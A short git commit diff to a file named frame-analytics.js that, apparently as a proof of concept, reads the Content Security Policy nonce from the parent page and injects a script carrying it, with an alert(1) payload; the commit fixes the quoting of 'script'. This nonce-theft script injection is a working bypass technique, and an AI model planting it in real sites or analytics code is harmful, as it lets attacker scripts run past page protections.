0cff0fd65ecd4148f88e137c85d5edb7c97c1530
red-assassin <47035599+red-assassin@users.noreply.github.com>
2020-11-05 16:19:07 +0530

    Update frame-analytics.js

--- files/analytics/js/frame-analytics.js
+++ files/analytics/js/frame-analytics.js
@@ -3,7 +3,7 @@ console.log("shibli");
 setTimeout(() => {
   var nonce = window.parent.document.getElementsByTagName("script")[0].nonce;
   console.log(nonce);
-  var x = window.parent.document.createElement(script);
+  var x = window.parent.document.createElement("script");
   x.setAttribute("nonce", nonce);
   x.innerHTML="alert(1)";
   window.parent.document.body.appendChild(x);
